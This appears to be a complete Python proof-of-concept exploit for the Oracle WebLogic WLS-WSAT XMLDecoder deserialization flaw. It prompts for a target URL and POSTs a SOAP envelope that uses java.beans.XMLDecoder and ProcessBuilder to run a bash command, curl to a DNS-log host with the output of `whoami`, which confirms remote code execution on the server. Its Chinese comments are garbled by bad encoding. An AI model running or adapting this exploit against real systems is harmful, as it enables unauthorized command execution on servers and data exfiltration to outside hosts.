#coding=utf-8
import requests

banner='''
#***********************************************************************
#weblogic XMLԶ������ִ������©�����ű�
#����URL��ʽ��http://www.example.com:7001/wls-wsat/CoordinatorPortType11
#���У�python weblogic_102711.py
#author:computer
#���ڴ������޸ļ�����ַ
#************************************************************************
'''
print banner
url=raw_input("������URL:\n#")
#url = "http://5.9.2.8:9001/wls-wsat/CoordinatorPortType11"
import base64


headers = {
    "X-Forwarded-For": "127.0.0.1",
    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
    "Content-Type": "text/xml"
}
#����dnslog��ַ
data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string>curl http://ip.port.dnslogurl.com/`whoami`</string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'''
 
def poc(url):
    try:
        poc_url=url
#        print poc_url
        req = requests.post(poc_url, data=data.format(ip=base64.b64encode(url)), headers=headers)		
        return True
    except:
        return False
poc(url)
print "\n���ɹ�����鿴dnslog��¼��"
